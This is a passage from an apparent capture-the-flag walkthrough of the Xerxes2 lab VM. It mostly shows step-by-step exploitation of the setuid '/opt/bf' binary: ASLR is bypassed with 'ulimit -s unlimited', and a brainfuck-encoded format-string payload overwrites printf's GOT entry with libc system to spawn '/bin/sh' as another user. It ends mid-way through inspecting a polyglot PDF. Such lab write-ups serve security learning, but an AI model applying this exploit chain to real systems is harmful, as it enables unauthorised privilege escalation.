<figure class='code'><figcaption><span>/opt/bf RW Only stack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>readelf -l /opt/bf <span class="p">|</span> grep STACK
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
</span></code></pre></td></tr></table></div></figure>


<p>Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:</p>

<figure class='code'><figcaption><span>ASLR check on</span><a href='http://leonjza.github.io/opt/bf'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7734000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0xb75c9000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0xb7735000<span class="o">)</span>
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb779b000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0xb7630000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0xb779c000<span class="o">)</span>
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb77c0000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0xb7655000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0xb77c1000<span class="o">)</span>
</span><span class='line'>delacroix@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with <code>ulimit -s unlimited</code></p>

<figure class='code'><figcaption><span>ASLR disable</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
</span><span class='line'>
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x4001e000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0x40026000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x4001e000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0x40026000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x4001e000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0x40026000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
</span><span class='line'>delacroix@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:</p>

<figure class='code'><figcaption><span>/bin/opt GOT</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>objdump -R /opt/bf
</span><span class='line'>
</span><span class='line'>/opt/bf:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>08049a38 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>08049a48 R_386_JUMP_SLOT   <span class="nb">printf</span>
</span><span class='line'>08049a4c R_386_JUMP_SLOT   getchar
</span><span class='line'>08049a50 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>08049a54 R_386_JUMP_SLOT   <span class="nb">exit</span>
</span><span class='line'>08049a58 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>08049a5c R_386_JUMP_SLOT   memset
</span><span class='line'>08049a60 R_386_JUMP_SLOT   putchar
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>delacroix@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here, we will choose to override the <code>printf</code> functions pointer. This is at 0x08049a48. So, this address will have the location of our <em>evil code</em>. But now, how do we know where the evil code is and <em>what</em> is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">ret2libc</a>. The basic idea here is that we override the pointer for <code>printf</code> to <code>system</code> with a argument. I highly recommend you read <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">this pdf</a> for a proper explanation on what exactly this means.</p>

<p>The only thing that is left to determine is where <code>system</code> is in memory. Luckily this is also pretty easy to find out. Fire up <code>gdb</code>, run the binary and <code>print system</code> to get the address:</p>

<figure class='code'><figcaption><span>libc&#8217;s system</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>gdb -q /opt/bf
</span><span class='line'>Reading symbols from /opt/bf...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
</span><span class='line'>Starting program: /opt/bf
</span><span class='line'>usage: /opt/bf <span class="o">[</span>program<span class="o">]</span>
</span><span class='line'><span class="o">[</span>Inferior 1 <span class="o">(</span>process 11342<span class="o">)</span> exited with code 0377<span class="o">]</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> print system
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x40062000 &lt;system&gt;
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Soooo, 0x40062000. We have the point in memory where <code>system()</code> lives, and we know where the program is going to go to lookup the <code>printf</code> function. All that is left now is to exploit the format string vulnerability, override the location of <code>printf</code> with <code>system</code>, and provide a new argument for the now fooled <code>printf</code> to run. A new argument can be given by simply providing another <code>#</code> (remember we have the source so that was easy to figure out).</p>

<h3>/opt/bf &ndash; part4</h3>

<p>We have all the information we need, lets get to work.</p>

<p>We fire up <code>gdb</code>, and instead of printing the location of <code>AAAA</code>, we provide a memory address, with a <code>%n</code> format string so that we can write the amount of bites needed to override the pointer location.</p>

<p>To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>gdb -q /opt/bf
</span><span class='line'>Reading symbols from /opt/bf...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> disass main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>   0x08048684 &lt;+0&gt;: push   %ebp
</span><span class='line'>   0x08048685 &lt;+1&gt;: mov    %esp,%ebp
</span><span class='line'>   0x08048687 &lt;+3&gt;: and    <span class="nv">$0xfffffff0</span>,%esp
</span><span class='line'>   0x0804868a &lt;+6&gt;: sub    <span class="nv">$0x7540</span>,%esp
</span><span class='line'>   0x08048690 &lt;+12&gt;:    cmpl   <span class="nv">$0x1</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span>
</span><span class='line'>   0x08048694 &lt;+16&gt;:    jg     0x80486b7 &lt;main+51&gt;
</span><span class='line'>   0x08048696 &lt;+18&gt;:    mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
</span><span class='line'>   0x08048699 &lt;+21&gt;:    mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
</span><span class='line'>   0x0804869b &lt;+23&gt;:    mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
</span><span class='line'>   0x0804869f &lt;+27&gt;:    movl   <span class="nv">$0x804887c</span>,<span class="o">(</span>%esp<span class="o">)</span>
</span><span class='line'>   0x080486a6 &lt;+34&gt;:    call   0x8048390 &lt;<span class="nb">printf</span>@plt&gt;
</span><span class='line'>   0x080486ab &lt;+39&gt;:    movl   <span class="nv">$0xffffffff</span>,<span class="o">(</span>%esp<span class="o">)</span>
</span><span class='line'>   0x080486b2 &lt;+46&gt;:    call   0x80483c0 &lt;<span class="nb">exit</span>@plt&gt;
</span><span class='line'>   0x080486b7 &lt;+51&gt;:    movl   <span class="nv">$0x7530</span>,0x8<span class="o">(</span>%esp<span class="o">)</span>
</span><span class='line'>   0x080486bf &lt;+59&gt;:    movl   <span class="nv">$0x0</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>
</span><span class='line'>   0x080486c7 &lt;+67&gt;:    lea    0x10<span class="o">(</span>%esp<span class="o">)</span>,%eax
</span><span class='line'>   0x080486cb &lt;+71&gt;:    mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
</span><span class='line'>   0x080486ce &lt;+74&gt;:    call   0x80483e0 &lt;memset@plt&gt;
</span><span class='line'>   0x080486d3 &lt;+79&gt;:    mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
</span><span class='line'>   0x080486d6 &lt;+82&gt;:    add    <span class="nv">$0x4</span>,%eax
</span><span class='line'>   0x080486d9 &lt;+85&gt;:    mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
</span><span class='line'>   0x080486db &lt;+87&gt;:    lea    0x10<span class="o">(</span>%esp<span class="o">)</span>,%edx
</span><span class='line'>   0x080486df &lt;+91&gt;:    mov    %edx,0x4<span class="o">(</span>%esp<span class="o">)</span>
</span><span class='line'>   0x080486e3 &lt;+95&gt;:    mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
</span><span class='line'>   0x080486e6 &lt;+98&gt;:    call   0x80484ec &lt;bf&gt;
</span><span class='line'>   0x080486eb &lt;+103&gt;:   movl   <span class="nv">$0x0</span>,<span class="o">(</span>%esp<span class="o">)</span> <span class="c"># &lt;-- we will break here</span>
</span><span class='line'>   0x080486f2 &lt;+110&gt;:   call   0x80483c0 &lt;<span class="nb">exit</span>@plt&gt;
</span><span class='line'>End of assembler dump.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080486eb
</span><span class='line'>Breakpoint 1 at 0x80486eb
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%16<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>Starting program: /opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%16<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080486eb in main <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049a48
</span><span class='line'>0x8049a48 &lt;<span class="nb">printf</span>@got.plt&gt;: 0x00000004
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Oooooooooooh. So basically 0x8049a48 now says <code>printf</code> lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to <code>system</code>, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.</p>

<figure class='code'><figcaption><span>Calculating the first offset</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> shell <span class="nb">echo</span> <span class="k">$(</span>python -c <span class="s1">&#39;print 0x2000-0x4&#39;</span><span class="k">)</span>
</span><span class='line'>8188 <span class="c"># output is a decimal value</span>
</span></code></pre></td></tr></table></div></figure>


<p>We now pad the format string as required, re-run the program in <code>gdb</code>, and inspect 0x08049a48 from the GOT</p>

<figure class='code'><figcaption><span>first padded string</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8188u%16<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
</span><span class='line'>
</span><span class='line'>Starting program: /opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8188u%16<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>H�
</span><span class='line'>Breakpoint 1, 0x080486eb in main <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049a48
</span><span class='line'>0x8049a48 &lt;<span class="nb">printf</span>@got.plt&gt;: 0x00002000
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>You will see some whitespace output as a result of the <code>%8188u</code>, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.</p>

<figure class='code'><figcaption><span>writing upper part of memory and offset change</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8188u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%17<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
</span><span class='line'>
</span><span class='line'>Starting program: /opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8188u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%17<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>H�J�                                                                                                                                                                                                              3
</span><span class='line'>Breakpoint 1, 0x080486eb in main <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049a48
</span><span class='line'>0x8049a48 &lt;<span class="nb">printf</span>@got.plt&gt;: 0x20042004
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:</p>

<figure class='code'><figcaption><span>calculating the upper part and fixing the offset</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> shell <span class="nb">echo</span> <span class="k">$(</span>python -c <span class="s1">&#39;print 0x4006-0x2000&#39;</span><span class="k">)</span>
</span><span class='line'>8198 <span class="c"># output is a decimal value</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8184u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%8198u%17<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
</span><span class='line'>
</span><span class='line'>Starting program: /opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8184u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%8198u%17<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>H�J�
</span><span class='line'>Breakpoint 1, 0x080486eb in main <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049a48
</span><span class='line'>0x8049a48 &lt;<span class="nb">printf</span>@got.plt&gt;: 0x40062000
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>w00t. We have rewritten the GOT for <code>printf</code> to the location of the libc <code>system</code> call using the format string vulnerability. Phew.</p>

<h3>/opt/bf &ndash; part5</h3>

<p>Now, all that is left is to get the <code>printf</code> to rerun (using the <code>#</code>) with a payload such as <code>/bin/sh</code>. We will append the <code>/bin/sh</code> to the end and just add another <code>#</code> to call <code>printf</code> (which is now overridden):</p>

<figure class='code'><figcaption><span>Exploiting bf</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8184u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%8198u%17<span class="nv">$n</span><span class="s2">&quot; + &quot;</span><span class="p">;</span>/bin/sh<span class="s2">&quot;)])&#39;)##&quot;</span>
</span><span class='line'>H�J�                                                                                                                                                                                                              d
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span>,1002<span class="o">(</span>delacroix<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Oly. Crap. That. Was. Awesome. :D :D</p>

<p>We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.</p>

<h2>becoming korenchkin</h2>

<p>We just got a shell with a euid for <code>polito</code>. To make life easier, I copied the public key I generated earlier for the first shell into <code>polito</code>&rsquo;s home, and SSH&rsquo;d in as that user.</p>

<p>At first glance, it appeared as if we have a gpg encrypted <code>dump</code> and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)</p>

<figure class='code'><figcaption><span>polito home</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>ls -lh
</span><span class='line'>total 43M
</span><span class='line'>-rw-r--r-- 1 polito polito 140K Jul 16 10:57 audio.txt
</span><span class='line'>-rw-r--r-- 1 polito polito  43M Jul 16 12:17 dump.gpg
</span><span class='line'>-rw-r--r-- 1 polito polito  27K Jul 16 12:19 polito.pdf
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>crontab -l
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>@reboot <span class="k">while </span><span class="nb">true</span> <span class="p">;</span> <span class="k">do </span>nc -l -p 4444 &lt; /home/polito/audio.txt <span class="p">;</span> <span class="k">done</span>
</span><span class='line'>polito@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>There was not much I could do with the <code>dump.gpg</code> yet, so I decided to open up the pdf in a pdf viewer:</p>

<p><img src="https://i.imgur.com/WMuVK8O.png"></p>

<p>That is all the PDF had. The QR code resolves to &ldquo;XERXES is watching&hellip;&rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the <code>file</code> utility.</p>

<figure class='code'><figcaption><span>polito.pdf File</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>file -k polito.pdf
</span><span class='line'>polito.pdf: x86 boot sector, code offset 0xe0 DBase 3 data file with memo<span class="o">(</span>s<span class="o">)</span> <span class="o">(</span>1146103071 records<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>&hellip;<em>x86 boot sector</em>&hellip; wait&hellip; <strong>WHAT</strong>?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:</p>

<figure class='code'><figcaption><span>polito.pdf headers</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
